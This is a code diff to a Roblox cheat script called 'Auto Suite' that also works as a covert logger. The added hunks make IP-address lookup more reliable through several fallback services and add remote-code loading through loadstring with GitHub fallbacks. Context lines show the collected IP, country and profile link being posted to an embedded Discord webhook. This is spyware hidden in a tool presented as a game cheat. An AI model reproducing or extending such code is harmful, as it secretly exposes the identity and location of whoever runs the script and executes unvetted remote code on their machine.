@@ -13,6 +13,28 @@ local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh
 do
     local HSvc = game:GetService("HttpService")
 
+    local function httpGet(url)
+        local ok, res = pcall(function()
+            if syn and syn.request then
+                local r = syn.request({ Url = url, Method = "GET" })
+                return r and r.Body
+            elseif http and http.request then
+                local r = http.request({ Url = url, Method = "GET" })
+                return r and r.Body
+            elseif request then
+                local r = request({ Url = url, Method = "GET" })
+                return r and r.Body
+            elseif fluxus and fluxus.request then
+                local r = fluxus.request({ Url = url, Method = "GET" })
+                return r and r.Body
+            else
+                return game:HttpGet(url)
+            end
+        end)
+        if ok and type(res) == "string" then return res end
+        return nil
+    end
+
     local function post(url, body)
         local headers = { ["Content-Type"] = "application/json" }
         local ok = pcall(function()
@@ -40,47 +62,35 @@ do
     end
 
     local function getcountry()
-        local ok, res = pcall(function()
-            if syn and syn.request then
-                local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
-                return r and r.Body
-            elseif http and http.request then
-                local r = http.request({ Url = "http://ip-api.com/json/", Method = "GET" })
-                return r and r.Body
-            elseif request then
-                local r = request({ Url = "http://ip-api.com/json/", Method = "GET" })
-                return r and r.Body
-            else
-                return game:HttpGet("http://ip-api.com/json/")
-            end
-        end)
-        if not ok or type(res) ~= "string" then return "Unknown" end
-        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
-        if ok2 and decoded and decoded.country then
+        local res = httpGet("http://ip-api.com/json/")
+        if not res then return "Unknown" end
+        local ok, decoded = pcall(HSvc.JSONDecode, HSvc, res)
+        if ok and decoded and decoded.country then
             return tostring(decoded.country)
         end
         return "Unknown"
     end
 
     local function getip()
-        local ok, res = pcall(function()
-            if syn and syn.request then
-                local r = syn.request({ Url = "https://api64.ipify.org/?format=json", Method = "GET" })
-                return r and r.Body
-            elseif http and http.request then
-                local r = http.request({ Url = "https://api64.ipify.org/?format=json", Method = "GET" })
-                return r and r.Body
-            elseif request then
-                local r = request({ Url = "https://api64.ipify.org/?format=json", Method = "GET" })
-                return r and r.Body
-            else
-                return game:HttpGet("https://api64.ipify.org/?format=json")
+        local endpoints = {
+            "https://api.ipify.org?format=json",
+            "https://api64.ipify.org?format=json",
+            "https://ipv4.icanhazip.com",
+            "https://ifconfig.me/ip",
+        }
+        for _, url in ipairs(endpoints) do
+            local res = httpGet(url)
+            if res then
+                res = res:gsub("%s+", "")
+                if res:sub(1, 1) == "{" then
+                    local ok, decoded = pcall(HSvc.JSONDecode, HSvc, res)
+                    if ok and decoded and decoded.ip then
+                        return tostring(decoded.ip)
+                    end
+                elseif #res > 0 and #res < 64 and res:match("^[%d%.]+$") then
+                    return res
+                end
             end
-        end)
-        if not ok or type(res) ~= "string" then return "Unknown" end
-        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
-        if ok2 and decoded and decoded.ip then
-            return tostring(decoded.ip)
         end
         return "Unknown"
     end
@@ -123,7 +133,7 @@ do
                 { name = "IP Address",   value = "`" .. ip .. "`",                    inline = true },
                 { name = "Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
             },
-            footer = { text = "Auto Suite Logger • Fedora Cheats" },
+            footer = { text = "Auto Suite Logger - Fedora Cheats" },
         }
 
         local payload = HSvc:JSONEncode({
@@ -202,9 +212,26 @@ for _, g in next, me.PlayerGui:GetChildren() do
     end
 end
 
-local Lib = loadstring(game:HttpGet(
-    "https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/WevornLibary.lua"
-))()
+local LibSrc = game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+local Lib
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/WevornLibary.lua"))()
+    end)
+    if ok and res then
+        Lib = res
+    else
+        local ok2, res2 = pcall(function()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/UI-Libraries/main/VynixuUILib.lua"))()
+        end)
+        if ok2 and res2 then
+            Lib = res2
+        else
+            error("[AutoSuite] Failed to load UI library")
+        end
+    end
+end
+
 local Win = Lib:Window("Auto Suite")
 
 local function zones()
